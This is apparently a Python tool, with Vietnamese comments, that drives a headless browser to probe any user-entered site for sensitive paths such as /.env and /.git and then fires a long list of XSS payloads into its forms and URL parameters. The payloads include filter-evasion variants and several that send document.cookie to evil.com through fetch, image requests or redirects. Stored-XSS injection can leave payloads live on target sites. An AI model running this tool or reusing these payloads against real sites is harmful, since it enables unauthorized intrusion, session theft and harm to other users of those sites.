import time
import signal
import sys
import logging
from urllib.parse import urljoin
from playwright.sync_api import sync_playwright

# Thiết lập logging
logging.basicConfig(filename='scan.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Danh sách payloads XSS mở rộng
XSS_PAYLOADS = [
    # Payloads cơ bản
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<script>alert(123)</script>",

    # Payloads vượt qua bộ lọc đơn giản
    "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<script src='javascript:alert(\"XSS\")'>",
    "<script>eval('ale'+'rt(\"XSS\")')</script>",

    # Payloads dựa trên sự kiện (event-based)
    "<img src=x onerror=alert(1)>",
    "<body onload=alert('XSS')>",
    "<div onmouseover=alert('XSS')>Hover me!</div>",
    "<input type='text' onfocus=alert('XSS') autofocus>",
    "<iframe src='javascript:alert(\"XSS\")'>",
    "<a href='javascript:alert(\"XSS\")'>Click me</a>",

    # Payloads sử dụng các thẻ HTML khác
    "<svg><script>alert('XSS')</script></svg>",
    "<embed src='javascript:alert(\"XSS\")'>",
    "<object data='javascript:alert(\"XSS\")'>",
    "<math><maction actiontype='statusline#http://evil.com' xlink:href='javascript:alert(\"XSS\")'>Click</maction></math>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS\")'>",

    # Payloads dựa trên thuộc tính HTML
    "<div style='xss:expr/*XSS*/ession(alert(\"XSS\"))'>",
    "<img src='x' style='xss:expression(alert(\"XSS\"))'>",
    "<div style='background-image:url(\"javascript:alert('XSS')\")'>",
    "<input value='x' onclick='alert(\"XSS\")'>",
    "<form action='javascript:alert(\"XSS\")'><button>Submit</button></form>",

    # Payloads vượt qua bộ lọc nâng cao
    "<img src=`x` onerror=`alert('XSS')`>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
    "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
    "<img src=x onerror=eval('ale'+'rt(1)')>",
    "<script>eval('window[\"ale'+'rt\"](\"XSS\")')</script>",

    # Payloads DOM-based XSS
    "javascript:alert(document.location)",
    "javascript:alert(document.cookie)",
    "javascript:void(document.body.innerHTML='<h1>XSS</h1>')",
    "javascript:document.write('<script>alert(\"XSS\")</script>')",
    "javascript:window.location='http://evil.com?' + document.cookie",

    # Payloads sử dụng các ký tự đặc biệt
    "<script>alert('XSS')</script".replace(">", ">"),
    "<script>alert('XSS')</script".replace("<", "<"),
    "'';!--\"<XSS>=&{()}",
    "<script>alert('XSS')//",
    "<script>alert('XSS')<!--",

    # Payloads nhắm đến các trường hợp cụ thể
    "test@example.com<script>alert('XSS')</script>",
    "test@example.com\" onmouseover=\"alert('XSS')",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<select onchange=alert('XSS')><option>XSS</option></select>",
    "<details open ontoggle=alert('XSS')>XSS</details>",

    # Payloads sử dụng các kỹ thuật phức tạp
    "<base href='javascript:alert(\"XSS\")//'>",
    "<script src='data:text/javascript,alert(\"XSS\")'></script>",
    "<script>fetch('http://evil.com?' + document.cookie)</script>",
    "<img src=x onerror='fetch(\"http://evil.com?\" + document.cookie)'>",
    "<script>new Image().src='http://evil.com?c='+document.cookie;</script>",

    # Payloads dạng mã hóa (Unicode, HTML entities)
    "<script>alert('XSS')</script>",
    "<script>alert('XSS')</script>",
    "\x3cscript\x3ealert('XSS')\x3c/script\x3e",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "<scr%69pt>alert('XSS')</scr%69pt>",

    # Payloads ngắn gọn để vượt qua giới hạn ký tự
    "<svg onload=alert(1)>",
    "<img/src=x onerror=alert(1)>",
    "<a href=javascript:alert(1)>x</a>",
    "<b/onclick=alert(1)>x</b>",
    "<script>alert`1`</script>",
]

# Danh sách các đường dẫn phổ biến để quét
COMMON_PATHS = [
    "/login", "/login.php", "/admin", "/admin/", "/dashboard", "/auth", "/signin",
    "/user/login", "/adminpanel", "/controlpanel", "/secure", "/administrator",
    "/wp-login.php", "/wp-admin", "/wp-content", "/phpmyadmin", "/pma", "/config.php",
    "/.env", "/.git", "/api", "/api/v1", "/uploads", "/upload", "/files", "/media",
    "/robots.txt", "/sitemap.xml", "/admin-console", "/webdav", "/guestbook.php", "/search.php"
]

# Biến toàn cục
stop_scanning = False
results_found = []

# Xử lý Ctrl+C
def signal_handler(sig, frame):
    global stop_scanning
    print("\n[!] Stopping scan...")
    stop_scanning = True
    if results_found:
        with open("scan_results.txt", "a") as f:
            for result in results_found:
                f.write(result + "\n")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Hàm quét các đường dẫn ban đầu
def scan_initial_paths(target):
    valid_paths = []
    print(f"\n[*] Scanning initial paths on {target}...")

    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(headless=True)
        context = browser.new_context(
            ignore_https_errors=True,
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        )
        page = context.new_page()

        for path in COMMON_PATHS:
            if stop_scanning:
                break
            full_url = urljoin(target, path)
            try:
                response = page.goto(full_url, timeout=30000)
                page.wait_for_load_state("networkidle", timeout=30000)
                status = response.status if response else 0

                if status in [200, 403, 401]:
                    print(f"[+] Found valid path: {path} - Status: {status}")
                    valid_paths.append(full_url)
                else:
                    print(f"[-] Invalid path: {path} - Status: {status}")
            except Exception as e:
                print(f"[-] Error on {path}: {e} - Status: Unknown")
            time.sleep(0.5)

        browser.close()
    return valid_paths

# Hàm kiểm tra XSS trên một URL
def exploit_xss(url, payloads):
    global stop_scanning
    print(f"\n[*] Testing XSS on {url}...")
    results = []

    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(headless=True)
        context = browser.new_context(
            ignore_https_errors=True,
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        )
        page = None

        try:
            page = context.new_page()
            alert_triggered = False
            def handle_dialog(dialog):
                nonlocal alert_triggered
                alert_triggered = True
                print(f"[*] Alert triggered on {url}: {dialog.message}")
                dialog.accept()

            page.on("dialog", handle_dialog)

            # Truy cập URL
            page.goto(url, timeout=30000)
            page.wait_for_load_state("networkidle", timeout=30000)

            # Kiểm tra các biểu mẫu
            forms = page.query_selector_all("form")
            if forms:
                print(f"[*] Found {len(forms)} forms on {url}. Testing payloads...")
                for form in forms:
                    # Tạo lại page để tránh lỗi mất context
                    page.close()
                    page = context.new_page()
                    page.on("dialog", handle_dialog)
                    page.goto(url, timeout=30000)
                    page.wait_for_load_state("networkidle", timeout=30000)
                    form = page.query_selector("form")

                    for payload in payloads:
                        if stop_scanning:
                            break
                        inputs = form.query_selector_all("input, textarea")
                        for input_field in inputs:
                            input_name = input_field.get_attribute("name") or "unnamed"
                            input_type = input_field.get_attribute("type") or "text"
                            # Bỏ qua các trường ẩn hoặc không thể chỉnh sửa
                            if input_type in ["hidden", "submit", "button"]:
                                continue
                            try:
                                page.fill(f"[name='{input_name}']", payload)
                            except Exception as e:
                                print(f"[!] Error filling input {input_name}: {e}")

                        # Submit form
                        try:
                            submit_button = form.query_selector("input[type='submit'], button[type='submit']")
                            if submit_button:
                                submit_button.click()
                            else:
                                page.evaluate("document.forms[0].submit()")
                            page.wait_for_load_state("networkidle", timeout=10000)
                        except Exception as e:
                            print(f"[!] Error submitting form: {e}")

                        # Kiểm tra Stored XSS
                        if payload in page.content():
                            result = f"[!!!] Potential Stored XSS found with payload '{payload}' at {url}"
                            print(result)
                            results.append(result)
                            logging.info(result)

                        # Kiểm tra alert (DOM-based XSS)
                        if alert_triggered:
                            result = f"[!!!] DOM-based XSS triggered with payload '{payload}' at {url}"
                            print(result)
                            results.append(result)
                            logging.info(result)

            # Kiểm tra Reflected XSS qua tham số URL
            for payload in payloads:
                if stop_scanning:
                    break
                test_url = f"{url}?q={payload}&search={payload}&test={payload}"
                try:
                    page.close()
                    page = context.new_page()
                    page.on("dialog", handle_dialog)
                    page.goto(test_url, timeout=30000)
                    page.wait_for_load_state("networkidle", timeout=30000)
                    if payload in page.content():
                        result = f"[!!!] Potential Reflected XSS found with payload '{payload}' at {test_url}"
                        print(result)
                        results.append(result)
                        logging.info(result)
                    if alert_triggered:
                        result = f"[!!!] DOM-based XSS triggered with payload '{payload}' at {test_url}"
                        print(result)
                        results.append(result)
                        logging.info(result)
                except Exception as e:
                    print(f"[!] Error testing Reflected XSS on {test_url}: {e}")

        except Exception as e:
            print(f"[!] Error accessing {url}: {e}")
        finally:
            if page:
                page.close()
            browser.close()

    return results

# Hàm quét tự động
def auto_exploit(target, paths, payloads):
    global stop_scanning, results_found
    print(f"\n[*] Starting XSS scan on {target}...")

    for path in paths:
        if stop_scanning:
            break
        results = exploit_xss(path, payloads)
        results_found.extend(results)

    if results_found:
        with open("scan_results.txt", "a") as f:
            for result in results_found:
                f.write(result + "\n")
        print("\n[*] Results saved to 'scan_results.txt'")

# Menu chính
def scan_xss_and_continue():
    global stop_scanning, results_found
    while True:
        stop_scanning = False
        results_found.clear()

        target_url = input("Enter target URL to scan for XSS (e.g., https://example.com/): ").strip()
        if not target_url.startswith(("http://", "https://")):
            target_url = "http://" + target_url

        valid_paths = scan_initial_paths(target_url)

        if target_url not in valid_paths:
            valid_paths.insert(0, target_url)

        if valid_paths:
            print(f"\n[*] Found {len(valid_paths)} valid paths: {valid_paths}")
            auto_exploit(target_url, valid_paths, XSS_PAYLOADS)
        else:
            print("[!] No valid paths found. XSS scan skipped.")

        print("\nScan completed!")
        print("1. Scan another URL")
        print("2. Exit")
        choice = input("Choice (1 or 2): ").strip()
        if choice != "1":
            print("[*] Exiting...")
            break

if __name__ == "__main__":
    print("[*] Starting XSS scanning tool...")
    try:
        scan_xss_and_continue()
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        sys.exit(1)